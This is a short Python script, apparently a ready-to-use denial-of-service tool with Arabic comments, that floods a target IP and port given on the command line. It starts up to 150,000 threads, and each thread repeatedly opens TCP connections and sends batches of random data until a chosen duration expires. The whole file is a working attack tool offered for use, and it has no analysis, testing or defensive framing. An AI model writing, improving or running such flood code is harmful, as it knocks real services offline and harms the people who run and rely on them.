import socket
import random
import sys
import threading
import time

if len(sys.argv) < 4:
    print("Usage: python3 tcp_attack.py <ip> <port> <duration>")
    sys.exit()

ip = sys.argv[1]
port = int(sys.argv[2])
duration = int(sys.argv[3])
timeout = time.time() + duration

print(f"🚀 Boosted TCP attack on {ip}:{port} for {duration} seconds...")

def attack():
    while time.time() < timeout:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((ip, port))
            for _ in range(100):  # إرسال دفعات كثيرة
                data = random._urandom(random.randint(1024, 4096))
                s.send(data)
            s.close()
        except:
            pass

threads = []

for i in range(150000):  # عدد كبير من الثريدات
    thread = threading.Thread(target=attack)
    thread.start()
    threads.append(thread)

for thread in threads:
    thread.join()

print("✅ TCP flood finished.")
